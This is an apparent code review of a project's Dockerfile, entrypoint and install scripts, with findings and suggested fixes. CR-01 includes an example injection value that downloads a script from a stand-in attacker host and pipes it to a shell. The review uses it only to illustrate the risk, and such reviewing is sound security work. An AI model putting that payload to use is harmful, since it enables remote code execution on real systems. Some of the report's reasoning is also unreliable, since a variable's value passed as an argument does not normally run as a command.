# Phase 21.6: Code Review Report

**Reviewed:** 2026-04-21T18:45:00Z
**Depth:** standard
**Files Reviewed:** 9

## Summary

This review covers the deployment setup files ported from hermes-agent: Dockerfile, Docker entrypoint, install script, developer setup script, example configs (.env.example, cli-config.yaml.example), .dockerignore, and SOUL.md. The existing `main.rs` was reviewed in context for consistency with these deployment artifacts.

The deployment files are generally well-structured with good practices (multi-stage Docker build, privilege dropping via gosu, template seeding that preserves user edits, `.env` permission hardening). However, there is one critical command injection vulnerability in the Docker entrypoint, several shell robustness warnings, and minor info items.

## Critical Issues

### CR-01: Command Injection via IRONHERMES_UID/IRONHERMES_GID in entrypoint.sh

**File:** `docker/entrypoint.sh:17-18`
**Issue:** The `IRONHERMES_UID` and `IRONHERMES_GID` environment variables are passed directly to `usermod -u` and `groupmod -g` without input validation. An attacker who can control these environment variables (e.g., via `docker run -e IRONHERMES_UID="1000; curl attacker.com/payload | sh"`) could inject arbitrary shell commands. While `set -e` is active, the `|| true` on line 18 and the `&&` short-circuit on line 17 do not prevent injection via the variable value itself.
**Fix:**
```bash
# Validate UID/GID are numeric before use
if [ -n "$IRONHERMES_UID" ]; then
    if ! echo "$IRONHERMES_UID" | grep -qE '^[0-9]+$'; then
        echo "Error: IRONHERMES_UID must be numeric, got: $IRONHERMES_UID" >&2
        exit 1
    fi
    usermod -u "$IRONHERMES_UID" ironhermes
fi
if [ -n "$IRONHERMES_GID" ]; then
    if ! echo "$IRONHERMES_GID" | grep -qE '^[0-9]+$'; then
        echo "Error: IRONHERMES_GID must be numeric, got: $IRONHERMES_GID" >&2
        exit 1
    fi
    groupmod -o -g "$IRONHERMES_GID" ironhermes 2>/dev/null || true
fi
```

## Warnings

### WR-01: entrypoint.sh groupmod error silently swallowed

**File:** `docker/entrypoint.sh:18`
**Issue:** The `|| true` after `groupmod` on line 18 is applied to the entire `[ -n ... ] && groupmod ...` expression due to shell operator precedence. If `$IRONHERMES_GID` is set but `groupmod` fails for a real reason (e.g., corrupted `/etc/group`), the error is silently swallowed. More critically, if `$IRONHERMES_GID` is empty, the `[ -n ... ]` test fails and `|| true` fires, which is the intended behavior -- but this means genuine `groupmod` failures are also masked.
**Fix:**
```bash
if [ -n "$IRONHERMES_GID" ]; then
    groupmod -o -g "$IRONHERMES_GID" ironhermes 2>/dev/null || true
fi
```
Use an explicit `if` block so `|| true` only applies to the `groupmod` command, and consider logging the failure instead of silencing it entirely.

### WR-02: install.sh trap uses single quotes inside double quotes

**File:** `install.sh:99`
**Issue:** The trap command `trap "rm -rf '$tmpdir'" EXIT` embeds single quotes inside a double-quoted string. This works in the common case, but if `mktemp -d` ever returns a path containing single quotes (unlikely on most systems but possible), the `rm -rf` command could break or behave unexpectedly. More robust to use a function or variable-based cleanup.
**Fix:**
```bash
tmpdir=$(mktemp -d)
cleanup() { rm -rf "$tmpdir"; }
trap cleanup EXIT
```

### WR-03: install.sh trap set inside download_binary is never cleared on early return

**File:** `install.sh:99`
**Issue:** The `trap "rm -rf '$tmpdir'" EXIT` is set inside `download_binary()` on line 99. If `download_binary` returns 1 (binary not found) and falls through to `cargo_install`, the trap is still active and will remove `$tmpdir` on EXIT. This is technically harmless since `$tmpdir` would be empty, but the trap persists for the rest of the script. If a future refactor reuses `tmpdir` or the variable name, this could cause unexpected cleanup. The trap should be scoped more carefully.
**Fix:** Move the tmpdir creation and trap to the top of `main()` or use a subshell for the download function:
```bash
download_binary() {
    (
        local tmpdir
        tmpdir=$(mktemp -d)
        trap "rm -rf '$tmpdir'" EXIT
        # ... download logic ...
    )
}
```

### WR-04: Shell scripts lack `set -u` (nounset) for undefined variable protection

**File:** `docker/entrypoint.sh:9`, `install.sh:14`, `setup-ironhermes.sh:14`
**Issue:** All three shell scripts use `set -e` but not `set -u` (or `set -euo pipefail`). Without `set -u`, referencing an undefined variable silently expands to an empty string. For deployment scripts that manipulate file paths (e.g., `$IRONHERMES_HOME`), an unset variable could lead to operations on unintended paths (e.g., `mkdir -p /` or `chmod 600 /.env`). The `IRONHERMES_HOME` defaults protect against this specific case, but other variables (like `$INSTALL_DIR` in entrypoint.sh) are assigned without defaults.
**Fix:** Add `set -u` (or `set -euo pipefail`) to each script's preamble:
```bash
set -euo pipefail
```
Note: for `install.sh` which uses `${IRONHERMES_VERSION:-latest}` patterns, `set -u` is already compatible since `:-` provides defaults. Verify all variable references have defaults or are guaranteed to be set.

## Info

### IN-01: Dockerfile Cargo dependency cache layer will be invalidated by empty src directories

**File:** `Dockerfile:17-38`
**Issue:** The Dockerfile copies `Cargo.toml` and `Cargo.lock` first (lines 17-32) for layer caching, then copies full source (lines 35-36). However, since only `Cargo.toml` files are copied for each crate (not even stub `src/lib.rs` files), the `cargo build` on line 39 will fail during the dependency-fetch layer if any crate's `Cargo.toml` references source files. The standard Docker layer-caching trick for Rust requires creating dummy `src/lib.rs` or `src/main.rs` files before the dependency build. This may work if the full source COPY on line 35 happens before the `RUN cargo build`, but then dependency caching is not actually achieved since any source change invalidates the layer.
**Fix:** This is a minor build optimization concern. If dependency caching is desired, add a step between the manifest copy and source copy:
```dockerfile
# Create empty source files for dependency compilation
RUN find crates -name Cargo.toml -exec sh -c 'dir=$(dirname {}); mkdir -p "$dir/src" && touch "$dir/src/lib.rs"' \;
RUN cargo build --release --bin ironhermes 2>/dev/null || true
# Now copy real source and rebuild
COPY crates/ crates/
COPY providers/ providers/
RUN cargo build --release --bin ironhermes
```

### IN-02: .dockerignore excludes all .lock files then re-includes Cargo.lock

**File:** `.dockerignore:7-8`
**Issue:** Lines 7-8 use `*.lock` followed by `!Cargo.lock` to exclude lock files but keep Cargo.lock. This pattern works correctly in Docker's .dockerignore syntax, but could be surprising to maintainers. A comment explaining the intent would improve clarity.
**Fix:** Add a comment:
```
# Exclude lock files (yarn, npm, etc.) but keep Cargo.lock for reproducible builds
*.lock
!Cargo.lock
```

### IN-03: Dockerfile does not pin Debian or Rust base image versions

**File:** `Dockerfile:9-12`
**Issue:** The Dockerfile uses `rust:latest` (line 12) and `debian:bookworm-slim` (line 42). Using `rust:latest` means builds are not reproducible across time -- a rebuild next month may use a different Rust version. The `debian:bookworm-slim` is better (pinned to bookworm) but still uses the rolling slim tag.
**Fix:** Pin to specific versions for reproducible builds:
```dockerfile
FROM rust:1.82-bookworm AS builder
FROM debian:bookworm-20241001-slim AS runtime
```
